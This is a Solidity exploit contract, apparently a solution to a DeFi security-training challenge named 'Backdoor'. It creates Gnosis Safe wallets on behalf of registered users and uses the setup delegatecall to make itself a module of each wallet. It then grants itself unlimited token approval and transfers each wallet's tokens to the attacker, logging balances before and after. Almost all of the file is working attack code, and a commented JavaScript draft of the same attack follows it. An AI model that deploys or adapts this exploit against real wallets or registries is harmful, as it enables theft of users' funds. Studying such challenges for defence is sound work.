// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "solmate/src/tokens/ERC20.sol";
import "hardhat/console.sol";






contract attackBackdoor 
{
        enum Operation {Call, DelegateCall}
address[] users;

    constructor(address masterCopy, address walletFactory, address walletRegistry, address token, address[] memory allUsers)
    {
        address player = msg.sender;
        GnosisSafeProxy proxy;
           // 095ea7b3  =>  approve(address,uint256)  

        delegateMap dmap = new delegateMap(); //gonna modify mapping address - address in modules contract

        
        {
        for(uint i=0;i< allUsers.length; i++)
        {
        address user = allUsers[i];
        users.push(user);

        // create2address of proxy =
        // address thiscontract = address(0x0116686E2291dbd5e317F47faDBFb43B599786Ef);
        address thiscontract = address(this);

        // b63e800d  =>  setup(address[],uint256,address,bytes,address,address,uint256,address)  
        bytes memory setupByteCode = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            users, //owners
            1, //threshold
            address(dmap),// address(0x0), //delegate call so useless //token to call
            abi.encodeWithSignature("enableModule2(address)",thiscontract),// 0x00, // delegate call fullAllowance, //data for the contract to call, full allowance to player's address 
            address(0x0), //fallback handler
            address(0x0), //payment token
            0, //payment
            address(0x0) //paymentReceiver    
        );



        ERC20 Token = ERC20(token);
        users.pop();


        console.log("Player balance before attack ", Token.balanceOf(player));



        proxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
            masterCopy, //singleton
            setupByteCode, //initializer
            0,  //salt nonce
            IProxyCreationCallback(walletRegistry) //callback
            );
        
        //Execute transaction to send from one to another
        {
            //for stack too deep error
            // ERC20 Token = ERC20(token);
        bytes memory fullAllowance = abi.encodeWithSelector(0x095ea7b3, address(this), type(uint256).max);


        // GnosisSafe(payable(proxy)).enableModule(msg.sender);
        console.log("is module enabled ", GnosisSafe(payable(proxy)).isModuleEnabled(player));

        GnosisSafe(payable(proxy)).execTransactionFromModule(
            token,
            0,
            fullAllowance,
            Enum.Operation(0) // 0 for Enum Call
        );

        console.log("player is ", player);
        console.log("proxy is ", address(proxy));

        console.log("Token Balance is ",Token.balanceOf( address(proxy) ));
        console.log("Token approval is ",Token.allowance( address(proxy) , player));

        console.log("Address of this contract ios ", address(this));

        Token.transferFrom( address(proxy), player, Token.balanceOf( address(proxy) ) ) ;

        console.log("Player balance after attack ", Token.balanceOf(player));

        }

        }
        }

    }


}

contract delegateMap is GnosisSafe
{
    function enableModule2(address a) public 
    {
        modules[a] = address(0x1);
    }
}

//waste JS CODE 

/*
 let ABI = [
            "function transfer(address to, uint amount)",

            `function setup(
                address[] calldata _owners,
                uint256 _threshold,
                address to,
                bytes calldata data,
                address fallbackHandler,
                address paymentToken,
                uint256 payment,
                address payable paymentReceiver
            )`,

            "function approve(address spender, uint256 amount)"

        ];
        let iface = new ethers.utils.Interface(ABI);

        let fullAllowance = iface.encodeFunctionData("approve", player.address, ethers.constants.MaxUint256);
        
        let setupByteCode = iface.encodeFunctionData("setup", 
            [alice.address, ], //owners
            1, //threshold
            token.address, //token to call
            fullAllowance, //data for the contract to call, full allowance to player's address 
            0x00, //fallback handler
            0x00, //payment token
            0, //payment
            0x00 //paymentReceiver    
        )

        await walletFactory.createProxyWithCallback(
            masterCopy.address, //singleton
            setupByteCode, //initializer
            0,  //salt nonce
            walletRegistry.address //callback
            )
        

*/